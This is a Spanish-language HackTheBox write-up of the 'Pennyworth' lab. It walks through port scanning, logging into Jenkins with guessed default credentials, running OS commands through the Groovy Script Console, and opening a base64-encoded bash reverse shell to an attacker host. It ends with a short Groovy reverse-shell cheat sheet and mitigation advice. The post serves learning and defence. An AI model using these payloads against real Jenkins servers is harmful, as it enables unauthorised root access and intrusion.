---
layout: post
title: HTB — Pennyworth
date: 2026-04-26
platform: HackTheBox
difficulty: very-easy
description: Jenkins con credenciales por defecto → RCE via Groovy Script Console
tags:
  - Jenkins
  - Groovy
  - Linux
---

## Introducción

Pennyworth presenta **Jenkins** — el servidor de integración continua más usado en el mundo — con credenciales por defecto y una funcionalidad legítima que se convierte en vector de ataque: la **Groovy Script Console**. Jenkins permite ejecutar código Groovy directamente en el servidor para tareas de administración, lo que en manos de un atacante equivale a ejecución de comandos sin restricciones.

---

## Reconocimiento

Verificamos conectividad:

```bash
ping -c 1 10.129.x.x
# -c 1    Envía solo 1 paquete ICMP
```

Descubrimiento de puertos:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.x.x -oG allports
# -p-          Escanea los 65535 puertos
# -sS          SYN scan (sigiloso, no completa el handshake TCP)
# --open       Muestra solo puertos abiertos
# --min-rate   Envía mínimo 5000 paquetes por segundo
# -vvv         Verbose: muestra resultados en tiempo real
# -n           Sin resolución DNS (más rápido)
# -Pn          Omite el host discovery (asume que el host está activo)
# -oG          Guarda el output en formato Grepable
```

Output relevante:

```
PORT     STATE SERVICE
8080/tcp open  http
```

Escaneo de versiones y scripts:

```bash
nmap -sCV -p8080 10.129.x.x -oN target
# -sC        Ejecuta scripts de detección por defecto (NSE)
# -sV        Detecta versión del servicio
# -p8080     Escanea solo el puerto 8080
# -oN        Guarda el output en formato Normal (legible)
```

Output relevante:

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39
|_http-title: Site doesn't have a title (text/html;charset=utf-8)
| http-robots.txt: 1 disallowed entry
|_/
```

Puerto 8080 con Jetty — servidor de aplicaciones Java típico de Jenkins.

---

## Enumeración web

Visito `http://10.129.x.x:8080` — panel de login de Jenkins.

---

## Explotación — Fase 1: credenciales por defecto

Pruebo credenciales comunes de Jenkins:

```
admin / admin      → fallo
admin / password   → fallo
root / password    → éxito
```

Acceso al panel de Jenkins como root.

---

## Explotación — Fase 2: Groovy Script Console

Navego a:

```
Manage Jenkins → Script Console
```

O directamente:

```
http://10.129.x.x:8080/script
```

La Script Console ejecuta código **Groovy** — lenguaje que corre sobre la JVM (Java Virtual Machine). Desde Groovy puedo llamar al sistema operativo directamente.

Verifico ejecución de comandos:

```groovy
println "id".execute().text
// execute()    Ejecuta el comando en el sistema operativo
// .text        Convierte el output a String
```

```
uid=0(root) gid=0(root) groups=0(root)
```

RCE confirmado como root.

---

## Reverse Shell

Para comandos con caracteres especiales (`>&`, `&`, `|`) uso base64 para evitar problemas de parsing:

```bash
# En mi Kali, genero el payload en base64
echo 'bash -i >& /dev/tcp/10.10.x.x/443 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC54LngvNDQzIDA+JjEK
```

Pongo netcat a escuchar:

```bash
nc -lvnp 443
# -l    Escucha conexiones entrantes
# -v    Verbose
# -n    Sin resolución DNS
# -p    Puerto a escuchar
```

Ejecuto en la Script Console:

```groovy
def cmd = ["bash", "-c", "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC54LngvNDQzIDA+JjEK | base64 -d | bash"].execute()
cmd.waitFor()
```

Shell recibida en netcat.

---

## Flag

```bash
cat /root/flag.txt
# 9cdfb439c7876e703e307864c9167a15
```

---

## ¿Qué aprendemos de esto?

**Jenkins nunca debería estar expuesto a internet sin autenticación robusta.** La Script Console es una funcionalidad legítima de administración — pero en manos equivocadas es RCE instantáneo. Si Jenkins es accesible públicamente, cualquier atacante que entre tiene control total del servidor.

**Las credenciales por defecto en herramientas de CI/CD son críticas.** Jenkins, GitLab, Bamboo, CircleCI — todas tienen cuentas de administrador que deben configurarse con contraseñas robustas antes de exponer el sistema.

**El base64 encoding resuelve problemas de caracteres especiales.** Cuando un payload tiene `>`, `&`, `|` u otros caracteres que el shell o el parser interpretan, encodear en base64 garantiza que el comando llegue intacto al destino.

---

## Referencia rápida: Groovy para CTF

```groovy
// Ejecutar comando simple
println "id".execute().text

// Ejecutar comando con argumentos
println ["ls", "-la", "/root"].execute().text

// Reverse shell con base64
def cmd = ["bash", "-c", "echo BASE64 | base64 -d | bash"].execute()
cmd.waitFor()
```

---

## Resumen técnico

| Elemento | Detalle |
|----------|---------|
| Puerto | 8080/tcp (Jenkins / Jetty 9.4.39) |
| Vulnerabilidad | Credenciales por defecto + Groovy Script Console |
| Credenciales | `root / password` |
| Acceso obtenido | RCE como root vía Script Console |
| Herramientas | `nmap`, navegador, `nc` |
| Mitigación | Cambiar credenciales por defecto, no exponer Jenkins a internet, restringir acceso a Script Console, implementar autenticación con roles |
